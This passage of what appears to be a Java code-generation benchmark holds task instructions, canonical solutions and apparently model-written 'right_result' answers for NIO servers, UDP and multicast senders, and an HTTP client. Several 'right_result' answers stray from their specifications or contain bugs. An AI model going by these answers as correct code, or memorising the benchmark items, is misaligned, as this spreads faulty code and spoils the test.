ByteBuffer.allocate(dataSize);\n            while (!isFull(body)) {\n                if (channel.read(body) == -1) {\n                    throw new RuntimeException(\"EOF error\");\n                }\n            }\n            \n            ByteBuffer tail = ByteBuffer.allocate(8);\n            while (!isFull(tail)) {\n                if (channel.read(tail) == -1) {\n                    break;\n                }\n            }\n            tail.flip();\n            \n            Checksum checksum = new Adler32();\n            checksum.update(body.array(), 0, dataSize);\n            if (tail.getLong() != checksum.getValue()) {\n                throw new RuntimeException(\"Data corrupted\");\n            }\n            \n            body.flip();\n            // Process packet here\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                channel.close();\n            } catch (Exception ex) {\n                ex.printStackTrace();\n            }\n        }\n    }\n\n    private boolean isFull(ByteBuffer buffer) {\n        return buffer.position() == buffer.capacity();\n    }\n\n    public void stop() {\n        try {\n            if (selector != null) {\n                selector.close();\n            }\n            if (serverChannel != null) {\n                serverChannel.close();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.*;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class NIOServer {\n    private ServerSocketChannel serverChannel;\n    private Selector selector;\n\n    public void start(int port) throws Exception {\n        serverChannel = ServerSocketChannel.open();\n        serverChannel.configureBlocking(false);\n        serverChannel.bind(new InetSocketAddress(port));\n\n        selector = Selector.open();\n        serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n        System.out.println(\"Server started on port \" + port);\n        while (true) {\n            if (selector.select() == 0) continue;\n\n            Set<SelectionKey> selectedKeys = selector.selectedKeys();\n            Iterator<SelectionKey> it = selectedKeys.iterator();\n\n            while (it.hasNext()) {\n                SelectionKey key = it.next();\n                it.remove();\n\n                try {\n                    if (key.isAcceptable()) {\n                        handleAccept(key);\n                    } else if (key.isValid() && key.isReadable()) {\n                        handleRead(key);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                    key.cancel();\n                    try {\n                        key.channel().close();\n                    } catch (IOException ex) {\n                        ex.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n\n    public void stop() {\n        try {\n            if (serverChannel != null) {\n                serverChannel.close();\n            }\n            if (selector != null) {\n                selector.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws IOException {\n        ServerSocketChannel server = (ServerSocketChannel) key.channel();\n        SocketChannel client = server.accept();\n        if (client != null) {\n            client.configureBlocking(false);\n            client.register(selector, SelectionKey.OP_READ);\n            System.out.println(\"Client connected: \" + client.getRemoteAddress());\n        }\n    }\n\n    private void handleRead(SelectionKey key) {\n        SocketChannel client = (SocketChannel) key.channel();\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        int bytesRead;\n\n        try {\n            while ((bytesRead = client.read(buffer)) > 0) {\n                buffer.flip();\n                byte[] data = new byte[buffer.limit()];\n                buffer.get(data);\n                processPacket(data);\n                buffer.clear();\n            }\n\n            if (bytesRead == -1) {\n                System.out.println(\"Client disconnected: \" + client.getRemoteAddress());\n                client.close();\n                key.cancel();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            try {\n                client.close();\n            } catch (IOException ex) {\n                ex.printStackTrace();\n            }\n        }\n    }\n\n    private void processPacket(byte[] data) {\n        if (data.length < 4) return;\n\n        int checksum = getChecksum(data, 0, data.length - 4);\n        int receivedChecksum = bytesToInt(data, data.length - 4);\n\n        if (checksum == receivedChecksum) {\n            System.out.println(\"Received valid packet: \" + new String(data, 0, data.length - 4));\n        } else {\n            System.out.println(\"Received invalid packet with mismatched checksum\");\n        }\n    }\n\n    private int getChecksum(byte[] data, int offset, int length) {\n        int sum = 0;\n        for (int i = 0; i < length; i++) {\n            sum += data[offset + i] & 0xFF;\n        }\n        return sum;\n    }\n\n    private int bytesToInt(byte[] bytes, int offset) {\n        int value = 0;\n        for (int i = 0; i < 4; i++) {\n            value = (value << 8) | (bytes[offset + i] & 0xFF);\n        }\n        return value;\n    }\n\n    private boolean isFull(ByteBuffer buffer) {\n        return buffer.position() == buffer.capacity();\n    }\n}\n```"
  },
  {
    "Task_id": 443,
    "Instruction": "Task Description: Create a Java class that implements a non-blocking TCP server using Java NIO (New I/O) to handle multiple client connections efficiently. The server should accept incoming connections, assign them to processors in a round-robin fashion, and manage connection lifecycle.\n\nClass Description: NIOAcceptor is a thread-based TCP server that uses Java NIO's Selector pattern to handle multiple client connections asynchronously. It creates a ServerSocketChannel, binds it to a specified port, and processes incoming connections by distributing them among available NIOProcessor instances.\n\nAttributes:\nport: [int] - The port number on which the server listens for incoming connections\nselector: [Selector] - The NIO selector used to monitor connection events\nserverChannel: [ServerSocketChannel] - The server socket channel that accepts client connections\nfactory: [FrontendConnectionFactory] - Factory for creating FrontendConnection objects\nprocessors: [NIOProcessor[]] - Array of processors for handling client connections\nnextProcessor: [int] - Index of the next processor to be used (round-robin assignment)\nacceptCount: [long] - Counter for accepted connections\n\nMethods:\nrun: [run()] -> [void] - Main thread loop that continuously checks for incoming connections using the selector\naccept: [accept()] -> [void] - Accepts a new client connection, configures it as non-blocking, and assigns it to a processor\nnextProcessor: [nextProcessor()] -> [NIOProcessor] - Returns the next available processor in round-robin fashion\ncloseChannel: [closeChannel(SocketChannel)] -> [void] - Closes the specified socket channel safely\n\nNested Class:\nAcceptIdGenerator: [static class] - Generates unique IDs for accepted connections with thread-safe increment operation\n  - acceptId: [long] - Current ID value\n  - lock: [Object] - Synchronization object\n  - getId: [getId()] -> [long] - Returns and increments the connection ID safely",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Set;\n\nimport org.apache.log4j.Logger;\n\npublic final class NIOAcceptor extends Thread {\n    private static final Logger LOGGER = Logger.getLogger(NIOAcceptor.class);\n    private static final AcceptIdGenerator ID_GENERATOR = new AcceptIdGenerator();\n\n    private final int port;\n    private final Selector selector;\n    private final ServerSocketChannel serverChannel;\n    private final FrontendConnectionFactory factory;\n    private NIOProcessor[] processors;\n    private int nextProcessor;\n    private long acceptCount;\n\n    public NIOAcceptor(String name, int port, FrontendConnectionFactory factory) throws IOException {\n        super.setName(name);\n        this.port = port;\n        this.selector = Selector.open();\n        this.serverChannel = ServerSocketChannel.open();\n        this.serverChannel.socket().bind(new InetSocketAddress(port));\n        this.serverChannel.configureBlocking(false);\n        this.serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n        this.factory = factory;\n    }\n\n    @Override\n    public void run() {\n        final Selector selector = this.selector;\n        for (;;) {\n            ++acceptCount;\n            try {\n                selector.select(1000L);\n                Set<SelectionKey> keys = selector.selectedKeys();\n                try {\n                    for (SelectionKey key : keys) {\n                        if (key.isValid() && key.isAcceptable()) {\n                            accept();\n                        } else {\n                            key.cancel();\n                        }\n                    }\n                } finally {\n                    keys.clear();\n                }\n            } catch (Throwable e) {\n                LOGGER.warn(getName(), e);\n            }\n        }\n    }\n\n    private void accept() {\n        SocketChannel channel = null;\n        try {\n            channel = serverChannel.accept();\n            channel.configureBlocking(false);\n            FrontendConnection c = factory.make(channel);\n            c.setAccepted(true);\n            c.setId(ID_GENERATOR.getId());\n            NIOProcessor processor = nextProcessor();\n            c.setProcessor(processor);\n            processor.postRegister(c);\n        } catch (Throwable e) {\n            closeChannel(channel);\n            LOGGER.warn(getName(), e);\n        }\n    }\n\n    private NIOProcessor nextProcessor() {\n        if (++nextProcessor == processors.length) {\n            nextProcessor = 0;\n        }\n        return processors[nextProcessor];\n    }\n\n    private static void closeChannel(SocketChannel channel) {\n        if (channel == null) {\n            return;\n        }\n        try {\n            channel.close();\n        } catch (IOException e) {\n        }\n    }\n\n    private static class AcceptIdGenerator {\n        private static final long MAX_VALUE = 0xffffffffL;\n        private long acceptId = 0L;\n        private final Object lock = new Object();\n\n        private long getId() {\n            synchronized (lock) {\n                if (acceptId >= MAX_VALUE) {\n                    acceptId = 0L;\n                }\n                return ++acceptId;\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\n\npublic class NIOAcceptor extends Thread {\n    private final int port;\n    private Selector selector;\n    private ServerSocketChannel serverChannel;\n    private FrontendConnectionFactory factory;\n    private NIOProcessor[] processors;\n    private int nextProcessor = 0;\n    private long acceptCount = 0;\n\n    public NIOAcceptor(int port, FrontendConnectionFactory factory, NIOProcessor[] processors) throws IOException {\n        this.port = port;\n        this.factory = factory;\n        this.processors = processors;\n        this.selector = Selector.open();\n        this.serverChannel = ServerSocketChannel.open();\n        serverChannel.configureBlocking(false);\n        serverChannel.bind(new InetSocketAddress(port));\n        serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n    }\n\n    @Override\n    public void run() {\n        try {\n            while (!Thread.interrupted()) {\n                if (selector.selectNow() > 0) {\n                    for (SelectionKey key : selector.selectedKeys()) {\n                        if (key.isAcceptable()) {\n                            accept();\n                        }\n                    }\n                    selector.selectedKeys().clear();\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            closeChannel(serverChannel);\n        }\n    }\n\n    private void accept() {\n        try {\n            SocketChannel clientChannel = serverChannel.accept();\n            if (clientChannel != null) {\n                clientChannel.configureBlocking(false);\n                NIOProcessor processor = nextProcessor();\n                processor.addConnection(factory.createFrontendConnection(clientChannel, new AcceptIdGenerator().getId()));\n                acceptCount++;\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private NIOProcessor nextProcessor() {\n        return processors[nextProcessor++ % processors.length];\n    }\n\n    private void closeChannel(SocketChannel channel) {\n        if (channel != null && channel.isOpen()) {\n            try {\n                channel.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    static class AcceptIdGenerator {\n        private long acceptId = 0;\n        private final Object lock = new Object();\n\n        long getId() {\n            synchronized (lock) {\n                return ++acceptId;\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 444,
    "Instruction": "Task Description: Create a Java class that implements UDP-based communication for sending metrics to a Graphite server using Java NIO's non-blocking DatagramChannel.\n\nClass Description: The GraphiteUDP class provides functionality to connect to a Graphite server via UDP, send metric data in the correct format, and handle connection management. It implements non-blocking UDP communication using Java NIO's DatagramChannel and includes error tracking and resource cleanup.\n\nAttributes:\n- hostname: [String] - The hostname of the Graphite server\n- port: [int] - The port number of the Graphite server\n- address: [InetSocketAddress] - The resolved socket address of the Graphite server\n- datagramChannel: [DatagramChannel] - The NIO channel used for UDP communication\n- failures: [int] - Counter for tracking failed send attempts\n\nMethods:\n- connect(): [void] -> [void] - Establishes a connection to the Graphite server by opening a DatagramChannel\n- isConnected(): [void] -> [boolean] - Checks if the connection to the Graphite server is active\n- send(): [String name, String value, long timestamp] -> [void] - Formats and sends a metric to the Graphite server\n- getFailures(): [void] -> [int] - Returns the count of failed send attempts\n- flush(): [void] -> [void] - Placeholder method (no action needed for UDP)\n- close(): [void] -> [void] - Closes the DatagramChannel and cleans up resources\n- sanitize(): [String s] -> [String] - Sanitizes metric names and values (delegates to GraphiteSanitize)\n- getDatagramChannel(): [void] -> [DatagramChannel] - Returns the current DatagramChannel instance\n- setDatagramChannel(): [DatagramChannel datagramChannel] -> [void] - Sets the DatagramChannel instance\n- getAddress(): [void] -> [InetSocketAddress] - Returns the current target address\n- setAddress(): [InetSocketAddress address] -> [void] - Sets the target address",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.net.InetAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\n\nimport static java.nio.charset.StandardCharsets.UTF_8;\n\npublic class GraphiteUDP implements GraphiteSender {\n\n    private final String hostname;\n    private final int port;\n    private InetSocketAddress address;\n\n    private DatagramChannel datagramChannel = null;\n    private int failures;\n\n    public GraphiteUDP(String hostname, int port) {\n        this.hostname = hostname;\n        this.port = port;\n        this.address = null;\n    }\n\n    public GraphiteUDP(InetSocketAddress address) {\n        this.hostname = null;\n        this.port = -1;\n        this.address = address;\n    }\n\n    @Override\n    public void connect() throws IllegalStateException, IOException {\n        if (isConnected()) {\n            throw new IllegalStateException(\"Already connected\");\n        }\n\n        if (hostname != null) {\n            address = new InetSocketAddress(InetAddress.getByName(hostname), port);\n        }\n\n        datagramChannel = DatagramChannel.open();\n    }\n\n    @Override\n    public boolean isConnected() {\n        return datagramChannel != null && !datagramChannel.socket().isClosed();\n    }\n\n    @Override\n    public void send(String name, String value, long timestamp) throws IOException {\n        try {\n            String str = sanitize(name) + ' ' + sanitize(value) + ' ' + Long.toString(timestamp) + '\\n';\n            ByteBuffer byteBuffer = ByteBuffer.wrap(str.getBytes(UTF_8));\n            datagramChannel.send(byteBuffer, address);\n            this.failures = 0;\n        } catch (IOException e) {\n            failures++;\n            throw e;\n        }\n    }\n\n    @Override\n    public int getFailures() {\n        return failures;\n    }\n\n    @Override\n    public void flush() throws IOException {\n        // Nothing to do\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (datagramChannel != null) {\n            try {\n                datagramChannel.close();\n            } finally {\n                datagramChannel = null;\n            }\n        }\n    }\n\n    protected String sanitize(String s) {\n        return GraphiteSanitize.sanitize(s);\n    }\n\n    DatagramChannel getDatagramChannel() {\n        return datagramChannel;\n    }\n\n    void setDatagramChannel(DatagramChannel datagramChannel) {\n        this.datagramChannel = datagramChannel;\n    }\n\n    InetSocketAddress getAddress() {\n        return address;\n    }\n\n    void setAddress(InetSocketAddress address) {\n        this.address = address;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 8,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\n\npublic class GraphiteUDP {\n    private String hostname;\n    private int port;\n    private InetSocketAddress address;\n    private DatagramChannel datagramChannel;\n    private int failures;\n\n    public GraphiteUDP(String hostname, int port) {\n        this.hostname = hostname;\n        this.port = port;\n        this.address = new InetSocketAddress(hostname, port);\n        this.failures = 0;\n    }\n\n    public void connect() throws IOException {\n        if (datagramChannel == null || !datagramChannel.isOpen()) {\n            datagramChannel = DatagramChannel.open();\n            datagramChannel.configureBlocking(false);\n        }\n    }\n\n    public boolean isConnected() {\n        return datagramChannel != null && datagramChannel.isOpen();\n    }\n\n    public void send(String name, String value, long timestamp) {\n        try {\n            String metricLine = sanitize(name) + \" \" + sanitize(value) + \" \" + timestamp + \"\\n\";\n            ByteBuffer buffer = ByteBuffer.wrap(metricLine.getBytes());\n            datagramChannel.send(buffer, address);\n        } catch (Exception e) {\n            failures++;\n        }\n    }\n\n    public int getFailures() {\n        return failures;\n    }\n\n    public void flush() {\n        // No action needed for UDP\n    }\n\n    public void close() {\n        if (datagramChannel != null && datagramChannel.isOpen()) {\n            try {\n                datagramChannel.close();\n            } catch (IOException e) {\n                // Ignore\n            }\n        }\n    }\n\n    public String sanitize(String s) {\n        return GraphiteSanitize.sanitize(s);\n    }\n\n    public DatagramChannel getDatagramChannel() {\n        return datagramChannel;\n    }\n\n    public void setDatagramChannel(DatagramChannel datagramChannel) {\n        this.datagramChannel = datagramChannel;\n    }\n\n    public InetSocketAddress getAddress() {\n        return address;\n    }\n\n    public void setAddress(InetSocketAddress address) {\n        this.address = address;\n    }\n}\n```"
  },
  {
    "Task_id": 445,
    "Instruction": "Task Description: Implement a Java class for UDP-based communication with OpenTracker for live synchronization of peer information using Java NIO's non-blocking DatagramChannel.\n\nClass Description: The OpentrackerLiveSync class handles UDP communication with an OpenTracker server for peer synchronization. It uses non-blocking I/O to send peer information packets to a multicast group. The class maintains a queue of outgoing messages and processes them in batches.\n\nAttributes:\n- toSend: TransferQueue<ByteBuffer> - Thread-safe queue holding outgoing peer information packets\n- channel: DatagramChannel - The UDP communication channel for sending data\n- id: byte[] - 4-byte random identifier for this client\n- running: volatile boolean - Flag controlling the operation of the sender thread\n- HEADER_LENGTH: static final int - Constant for header size (8 bytes)\n- PEER_LENGTH: static final int - Constant for peer information size (28 bytes)\n- PEERS_PER_PACKET: static final int - Constant for maximum peers per packet (50)\n\nMethods:\n- OpentrackerLiveSync() -> None - Constructor initializes random client ID\n- start() -> None - Initializes UDP channel and starts sender thread\n- incomingPacket(MessageBase msg) -> None - Processes incoming messages and queues valid peer requests\n- send() -> None - Worker method that sends batched peer information packets\n- stop() -> None - Stops the sender thread and closes the channel\n\nInput Parameters for Methods:\n- incomingPacket: msg [MessageBase] - The incoming message to process\n- (Other methods take no explicit parameters)\n\nOutput/Return Values:\n- All methods return void except the constructor\n- Methods primarily affect class state and perform I/O operations",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.Inet4Address;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.StandardProtocolFamily;\nimport java.net.StandardSocketOptions;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\nimport java.util.concurrent.LinkedTransferQueue;\nimport java.util.concurrent.ThreadLocalRandom;\nimport java.util.concurrent.TransferQueue;\n\npublic class OpentrackerLiveSync {\n\n    TransferQueue<ByteBuffer> toSend = new LinkedTransferQueue<>();\n    DatagramChannel channel;\n    byte[] id = new byte[4];\n    volatile boolean running = true;\n    \n    private static final int HEADER_LENGTH = 0x08;\n    private static final int PEER_LENGTH = 0x1C;\n    private static final int PEERS_PER_PACKET = 50;\n    \n    public OpentrackerLiveSync() {\n        ThreadLocalRandom.current().nextBytes(id);\n    }\n    \n    public void start() {\n        try {\n            channel = DatagramChannel.open(StandardProtocolFamily.INET);\n            channel.setOption(StandardSocketOptions.IP_MULTICAST_TTL, 1);\n            channel.setOption(StandardSocketOptions.SO_REUSEADDR, true);\n            channel.bind(new InetSocketAddress(0));\n            channel.connect(new InetSocketAddress(InetAddress.getByAddress(new byte[] {(byte) 224,0,23,5}), 9696));\n        } catch (IOException e) {\n            e.printStackTrace();\n            return;\n        }\n        \n        Thread t = new Thread(this::send);\n        t.setDaemon(true);\n        t.setName(\"opentracker-sync\");\n        t.start();\n    }\n    \n    public void incomingPacket(MessageBase msg) {\n        if(!running)\n            return;\n        if(msg.getType() != MessageBase.Type.REQ_MSG || msg.getMethod() != MessageBase.Method.GET_PEERS)\n            return;\n        \n        GetPeersRequest req = (GetPeersRequest) msg;\n        \n        ByteBuffer buf = ByteBuffer.allocate(PEER_LENGTH);\n        buf.put(req.getTarget().getHash());\n        buf.put(req.getOrigin().getAddress().getAddress());\n        buf.putShort((short) req.getOrigin().getPort());\n        buf.putShort((short) 0);\n        buf.flip();\n        toSend.add(buf);\n    }\n    \n    void send() {\n        ByteBuffer sendBuffer = ByteBuffer.allocate(HEADER_LENGTH);\n        sendBuffer.put(id);\n        sendBuffer.put(new byte[4]);\n        sendBuffer.flip();\n        \n        ByteBuffer[] buffers = new ByteBuffer[1 + PEERS_PER_PACKET];\n        buffers[0] = sendBuffer;\n\n        try {\n            while(running) {\n                for(int i = 1;i<buffers.length;i++) {\n                    buffers[i] = toSend.take();\n                }\n                \n                channel.write(buffers);\n                buffers[0].rewind();\n            }\n        } catch (IOException | InterruptedException e) {\n            running = false;\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        running = false;\n        try {\n            channel.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 8,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\npublic class OpentrackerLiveSync {\n    private final BlockingQueue<ByteBuffer> toSend = new LinkedBlockingQueue<>();\n    private DatagramChannel channel;\n    private byte[] id = new byte[4];\n    private volatile boolean running = false;\n    static final int HEADER_LENGTH = 8;\n    static final int PEER_LENGTH = 28;\n    static final int PEERS_PER_PACKET = 50;\n\n    public OpentrackerLiveSync() {\n        new java.util.Random().nextBytes(id);\n    }\n\n    public void start() throws IOException {\n        channel = DatagramChannel.open();\n        channel.configureBlocking(false);\n        channel.connect(new InetSocketAddress(\"239.255.255.250\", 1678));\n        running = true;\n        Thread senderThread = new Thread(this::send);\n        senderThread.start();\n    }\n\n    public void incomingPacket(MessageBase msg) {\n        if (msg.isValid()) {\n            ByteBuffer buffer = ByteBuffer.allocate(HEADER_LENGTH + (PEER_LENGTH * PEERS_PER_PACKET));\n            buffer.put(id);\n            buffer.putInt(msg.getPeerCount());\n            for (int i = 0; i < msg.getPeerCount(); i++) {\n                buffer.put(msg.getPeer(i).getAddress().getAddress());\n                buffer.putInt(msg.getPeer(i).getPort());\n            }\n            buffer.flip();\n            toSend.add(buffer);\n        }\n    }\n\n    private void send() {\n        while (running) {\n            try {\n                ByteBuffer packet = toSend.poll(100, TimeUnit.MILLISECONDS);\n                if (packet != null) {\n                    channel.write(packet);\n                }\n            } catch (InterruptedException | IOException e) {\n                Thread.currentThread().interrupt();\n                break;\n            }\n        }\n    }\n\n    public void stop() throws IOException {\n        running = false;\n        channel.close();\n    }\n}\n```"
  },
  {
    "Task_id": 446,
    "Instruction": "Task Description: Create a Java class that implements a non-blocking UDP sender using Java NIO's DatagramChannel for asynchronous communication.\n\nClass Description: The Sender class provides functionality to establish a non-blocking UDP connection, send data packets to a specified host and port, and manage the connection lifecycle. It uses Java NIO's DatagramChannel for efficient network communication.\n\nAttributes:\n- host: [String] - The target hostname or IP address for UDP communication\n- port: [int] - The target port number for UDP communication\n- address: [InetSocketAddress] - The socket address combining host and port for the target\n- channel: [DatagramChannel] - The NIO channel used for UDP communication\n\nMethods:\n- connect(): [void] -> [void] - Opens a DatagramChannel and prepares it for communication. Throws IOException if connection fails and IllegalStateException if already connected.\n- isConnected(): [void] -> [boolean] - Checks if the channel is currently connected and not closed.\n- send(ByteBuffer buffer): [ByteBuffer] -> [void] - Sends the contents of the provided ByteBuffer to the target address. Throws IOException if sending fails.\n- disconnect(): [void] -> [void] - Closes the DatagramChannel and releases resources. Safe to call even if not connected.",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\n\npublic class Sender {\n\n    private final String host;\n    private final int port;\n    private InetSocketAddress address;\n    private DatagramChannel channel;\n\n    public Sender(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void connect() throws IOException {\n        if (isConnected()) {\n            throw new IllegalStateException(\"Already connected\");\n        }\n        if (host != null) {\n            address = new InetSocketAddress(host, port);\n        }\n        channel = DatagramChannel.open();\n    }\n\n    public boolean isConnected() {\n        return channel != null && !channel.socket().isClosed();\n    }\n\n    public void send(ByteBuffer buffer) throws IOException {\n        channel.send(buffer, address);\n    }\n\n    public void disconnect() throws IOException {\n        if (channel == null) {\n            return;\n        }\n        try {\n            channel.close();\n        } finally {\n            channel = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 8,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\nimport java.nio.channels.UnresolvedAddressException;\n\npublic class Sender {\n    private final String host;\n    private final int port;\n    private final InetSocketAddress address;\n    private DatagramChannel channel;\n\n    public Sender(String host, int port) {\n        this.host = host;\n        this.port = port;\n        this.address = new InetSocketAddress(host, port);\n    }\n\n    public void connect() throws IOException {\n        if (isConnected()) {\n            throw new IllegalStateException(\"Already connected.\");\n        }\n        channel = DatagramChannel.open();\n        channel.configureBlocking(false);\n    }\n\n    public boolean isConnected() {\n        return channel != null && !channel.isClosed();\n    }\n\n    public void send(ByteBuffer buffer) throws IOException {\n        if (!isConnected()) {\n            throw new IOException(\"Not connected.\");\n        }\n        try {\n            channel.send(buffer, address);\n        } catch (UnresolvedAddressException e) {\n            throw new IOException(\"Failed to resolve target address.\", e);\n        }\n    }\n\n    public void disconnect() {\n        if (channel != null) {\n            try {\n                channel.close();\n            } catch (IOException ignored) {\n            } finally {\n                channel = null;\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 448,
    "Instruction": "Task Description: Implement a Java class for multicast UDP communication using Java NIO's DatagramChannel for both sending and receiving messages in a non-blocking manner.\n\nClass Description: The MulticastUDP class provides functionality for joining a multicast group, sending messages to specified targets, receiving messages from the group, and closing the communication channel. It utilizes Java NIO's non-blocking capabilities for efficient UDP communication.\n\nAttributes:\n- channel: DatagramChannel - The NIO channel used for UDP communication  \n- group: InetAddress - The multicast group address  \n- port: int - The port number for multicast communication  \n\nMethods:\n- MulticastUDP(String host, int port) -> void - Constructor that initializes the multicast group address and port, and opens a DatagramChannel  \n- joinGroup() -> void - Binds the channel to the specified port and joins the multicast group  \n- receive() -> String - Receives a message from the multicast group and returns it as a String  \n- send(String message, String targetHost, int targetPort) -> void - Sends a message to a specified target host and port  \n- close() -> void - Closes the DatagramChannel to release resources",
    "Canonical_solution": "import java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.net.StandardProtocolFamily;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\n\npublic final class MulticastUDP {\n\n    private DatagramChannel channel;\n    private InetAddress group;\n    private int port;\n\n    public MulticastUDP(String host, int port) throws Exception {\n        this.group = InetAddress.getByName(host);\n        this.port = port;\n        this.channel = DatagramChannel.open(StandardProtocolFamily.INET);\n    }\n\n    public void joinGroup() throws Exception {\n        channel.bind(new InetSocketAddress(port));\n        channel.join(group, Utils.getLocalNetworkInterface());\n    }\n\n    public String receive() throws Exception {\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        SocketAddress sender = channel.receive(buffer);\n        buffer.flip();\n        byte[] data = new byte[buffer.remaining()];\n        buffer.get(data);\n        return new String(data);\n    }\n\n    public void send(String message, String targetHost, int targetPort) throws Exception {\n        channel.configureBlocking(true);\n        InetSocketAddress sender = new InetSocketAddress(targetHost, targetPort);\n        channel.send(ByteBuffer.wrap(message.getBytes()), sender);\n    }\n\n    public void close() throws Exception {\n        channel.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 8,
    "right_result": "```java\nimport java.net.*;\nimport java.nio.*;\nimport java.nio.channels.DatagramChannel;\nimport java.nio.channels.MembershipKey;\n\npublic class MulticastUDP {\n    private DatagramChannel channel;\n    private InetAddress group;\n    private int port;\n\n    public MulticastUDP(String host, int port) throws Exception {\n        this.group = InetAddress.getByName(host);\n        this.port = port;\n        this.channel = DatagramChannel.open();\n        this.channel.configureBlocking(false);\n    }\n\n    public void joinGroup() throws Exception {\n        channel.bind(new InetSocketAddress(port));\n        MembershipKey membershipKey = channel.join(group, NetworkInterface.getByInetAddress(InetAddress.getLocalHost()));\n        membershipKey.setOption(StandardSocketOptions.IP_MULTICAST_TTL, (byte) 255);\n    }\n\n    public String receive() throws Exception {\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        SocketAddress sender = channel.receive(buffer);\n        if (buffer.position() > 0) {\n            buffer.flip();\n            byte[] data = new byte[buffer.remaining()];\n            buffer.get(data);\n            return new String(data);\n        }\n        return null;\n    }\n\n    public void send(String message, String targetHost, int targetPort) throws Exception {\n        InetAddress targetAddress = InetAddress.getByName(targetHost);\n        ByteBuffer buffer = ByteBuffer.wrap(message.getBytes());\n        channel.send(buffer, new InetSocketAddress(targetAddress, targetPort));\n    }\n\n    public void close() throws Exception {\n        if (channel != null && channel.isOpen()) {\n            channel.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 45,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for interacting with a radio scanner API, supporting both synchronous and asynchronous requests.\n\nClass Description: The RdioScannerHttpClient class provides methods to test API connections and send audio recordings to a radio scanner service using HTTP multipart form data requests. It uses Java's HttpClient for HTTP/2 communication with configurable timeouts and redirect policies.\n\nAttributes:\n- mHttpClient: [HttpClient] - The underlying HTTP client instance configured with HTTP/2 support, 20-second timeout, and normal redirect policy\n\nMethods:\n- testConnection: [testConnection]([RdioScannerConfiguration configuration]) -> [String] - Synchronously tests the API connection by sending a test request with the API key and system ID, returns the response body with status code or error message\n- sendAudioRecordingAsync: [sendAudioRecordingAsync]([RdioScannerConfiguration config, RdioScannerBuilder bodyBuilder]) -> [void] - Asynchronously sends an audio recording to the API using multipart form data, handles response completion with success/error callbacks",
